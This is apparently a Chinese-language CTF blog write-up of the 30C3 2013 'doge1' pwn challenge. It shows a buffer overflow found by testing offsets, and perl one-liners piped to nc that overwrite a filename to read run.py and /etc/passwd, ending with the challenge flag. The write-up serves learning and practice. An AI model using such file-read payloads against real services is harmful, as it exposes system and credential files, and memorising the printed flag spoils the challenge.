title: 30C3CTF 2013 PWN 100 DOGE1
date: 2013-12-30 21:25
category: pwn
tags: 3XC3CTF, bof
slug: 30c3ctf_2013_pwn_100_doge1

這次都沒有人陪打 QQ  
只解兩題 100 分...真慘  
不過這題 100 分，跟另一題的難度也差太多了吧 = =  
* * *

先用 nc 連線過去，要求我們輸入名稱，然後就看到一隻...豬頭?  
提示有兩個指令好用: `feed`, `show`  
`show` 是再印一次豬頭，`feed` 也差不多，奇怪的功能 = =  
![doge1.png]({filename}/images/30c3CTF_2013_doge_1.png)  

假如不輸入 `feed` 或 `show`，試著輸入長字串，毫無反應 Orz  
試試看輸入超長名稱....沒有印出那顆豬頭了 XD  

這題有提供原始程式，資料夾底下有三個檔案:

* ascii\_art\_doge\_color.txt
* doge.so
* run.py

*ascii_art_doge_color.txt* 就是那隻豬頭的 ascii 圖檔  
*run.py* 只有：  

```
#!/usr/bin/env python
import signal
import doge
signal.signal(signal.SIGCHLD, signal.SIG_IGN)
doge.listen("0.0.0.0", 1024)
```

*doge.so* 是編譯過的 linux library  
執行起來，並且輸入長字串看看結果，結果 server 端有噴出錯誤訊息  
>...  
>File "doge.pyx", line 54, in doge.Doge.\_\_str\_\_ (doge.c:1875)  
>IOError: [Errno 2] No such file or directory: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'  

看來是發生 bof 了 XD  
繼續試一下前面塞多少才會蓋到，結果是 "a"x32  
`perl -e 'print "a"x32 . "test"' | nc 0 1024`  
>...  
>File "doge.pyx", line 54, in doge.Doge.__str__ (doge.c:1875)  
>IOError: [Errno 2] No such file or directory: 'testi\_art\_doge\_color.txt'  

試試看能不能成功讀檔：
`perl -e 'print "a"x32 . "run.py\x00"' | nc 0 1024`
>Dogename: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaarun.py#!/usr/bin/env python  
>import signal  
>import doge  
>signal.signal(signal.SIGCHLD, signal.SIG\_IGN)  
>doge.listen("0.0.0.0", 1024)  
>commands: feed, show  

接下來就是猜猜看了...試了幾個檔案像是 *flag* , *flag.txt* , *key* , *key.txt* ...都失敗了 = =  
最後猜到 */etc/passwd*  
![flag.png]({filename}/images/30c3CTF_2013_doge_flag.png)

flag: `30C3_51dd250e0adb864ff40cc40b818852f4`
